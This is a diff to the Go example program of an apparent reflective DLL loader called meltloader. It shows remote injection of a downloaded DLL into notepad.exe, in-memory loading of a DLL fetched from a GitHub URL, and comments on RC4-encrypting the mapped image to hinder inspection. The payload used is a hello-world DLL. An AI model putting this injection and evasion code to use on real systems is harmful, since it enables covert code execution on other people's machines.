@@ -5,9 +5,11 @@ import (
 	"log"
 	"github.com/carved4/meltloader/pkg/pe"
 	"github.com/carved4/meltloader/pkg/net"
+	"runtime/debug"
 )
 
 func main() {
+	debug.SetGCPercent(-1)
 	log.Printf("[main] start")
 	// Load local test DLL that exports HostInfo (built in go-dll-src/)
 	pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
@@ -23,7 +25,7 @@ func main() {
 		fmt.Println("failed to download", err)
 		return
 	}
-	_, err = pe.LoadDLLRemote(pHandle, buff, "MessageBoxThread")
+	_, err = pe.LoadDLLRemote(pHandle, buff)
 	if err != nil {
 		log.Printf("[main] LoadDLLRemote failed: %v", err)
 		fmt.Println("failed to load", err)
@@ -34,7 +36,7 @@ func main() {
 	// you can also call the func without the sleep parameter as displayed below
 	// the mapped DLL in memory after load and execution is encrypted in place with RC4 and will not be able to be interacted with
 	// if you wish to change this in your own projects, just remove the defer enc.EncryptBuffer of our mapped image
-	mapping2, err := pe.LoadDLLFromURL("https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll", "MessageBoxThread")
+	mapping2, err := pe.LoadDLLFromURL("https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll", "export_only:MessageBoxThread")
 	if err != nil {
 		fmt.Println("failed to download", err)
 	}
